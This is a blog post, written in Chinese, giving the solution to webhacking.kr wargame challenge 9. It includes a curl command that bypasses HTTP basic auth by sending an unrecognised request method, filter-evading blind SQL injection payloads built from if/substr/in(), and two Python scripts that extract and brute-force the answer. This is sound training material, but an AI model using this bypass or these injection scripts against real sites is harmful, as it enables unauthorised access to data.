---
title: webhacking.kr challenge 9
author: rk700
layout: post
redirect_from: /writeup/2014/12/23/sql-if-clause
tags:
  - webhacking.kr
  - HTTP
  - sql
---

这道题花了好久啊才做出来……不愧是这么大分值的题目

首先，直接点击后就是遇到了HTTP basic auth。由于realm是sql injection world，我开始还以为在这里就要有注入……试了各种知道的payload发现没有用，于是在这里卡住了

然后是搜索时偶然发现[这里](http://cd34.com/blog/web-security/hackers-bypass-htaccess-security-by-using-gets-rather-than-get/)提到了他的basic auth被`GETS`方法绕过了，而实际上`GETS`并不是什么正确的方法，是因为配置时只检查了`GET`等常用方法，其他的也被解释成`GET`方法了，这点实在是太二了……所以只要我们使用其他方法就可以绕过这里，比如`OPTION`，就连

<pre>$ curl -b 'PHPSESSID=18r88ol7enbiqja7liuq623c43' 'http://webhacking.kr/challenge/web/web-09/index.php' -X WTF</pre>

这样都可以……

然后该页面有参数`no`，这里是有注入；还有有一个表格，提交参数`pw`，这里应该是得到的答案。具体地，`no`取1或2时，页面返回有Apple或Banana；当`no=3`时，会显示提示说长度是11，数据库的column是`id`和`no`。

对`no`参数尝试注入，发现一旦有危险字符就会返回denied，一个个试下来，很多都被过滤了。最后找到可用的payload是用if加substr，由于大于小于符号什么的也过滤了，所以用的是`in()`。基本格式如下：

<pre>select * from t1 where id=if(substr(name,1,1)in('D'),1,2);</pre>

在上面的语句中，`id=1`会被选中如果其对应的`name`首字符是`D`或者`d`，`id=2`会被选中如果其对应的`name`首字符不是`D`且不是`d`。这里大小写不区分，导致了后面的暴力破……对于这道题，我们需要每次只选中一行，而`no=0`是没有对应的行的，于是用

<pre>no=if(substr(id,1,1)in(0x41),1,0)</pre>

这样来确定`no=1`对应的`id`，得到是`APPLE`。用

<pre>no=if(substr(id,1,1)in(0x41),2,0)</pre>

这样来确定`no=2`对应的`id`，得到是`BANANA`。 最后用

<pre>no=if(substr(id,1,1)in(0x41),3,0)</pre>

这样来确定`no=3`对应的`id`，得到是`ALSRKSWHAQL`。用的代码如下

{% highlight python %}
#!/usr/bin/env python2

import httplib

def makePayload(statement):
    return "/challenge/web/web-09/index.php?no=if(substr(id,%d,1)in(%s),3,0)" % (statement[0], hex(statement[1]))

def checkResponse(response):
    return response.find("Secret") != -1

def doAssert(conn, statement):
    conn.request("WTF", makePayload(statement), "", header)
    response = conn.getresponse()
    content = response.read()

    return checkResponse(content)

if __name__ == "__main__":
    url = "webhacking.kr"
    header = {"cookie":"PHPSESSID=18r88ol7enbiqja7liuq623c43"}
    conn = httplib.HTTPConnection(url)
    result = []
    for idx in range(1,12):
        print "idx %d" % idx
        for code in range(33,127):
            if doAssert(conn, (idx, code)):
                print code
                result.append(chr(code))
                break
    print ''.join(result)
{% endhighlight %}

如上所说，由于没有区分大小写，这里并不能确定。由于总共是`2^11=2048`种情况，我想着并不多可以暴力一次，谁知道跑了好久好久……代码如下

{% highlight python %}
#!/usr/bin/env python2

import httplib
import itertools

if __name__ == "__main__":
    url = "webhacking.kr"
    header = {"cookie":"PHPSESSID=18r88ol7enbiqja7liuq623c43"}
    conn = httplib.HTTPConnection(url)

    for pw in map(''.join, itertools.product(*((c.upper(), c.lower()) for c in "ALSRKSWHAQL"))):
        conn.request("WTF", "/challenge/web/web-09/index.php?pw=%s" % pw, "", header)
        response = conn.getresponse()
        content = response.read()
        print content
{% endhighlight %}

结果跑到最后的一种情况是正确的，对应的是全小写……早知道先试下就好了
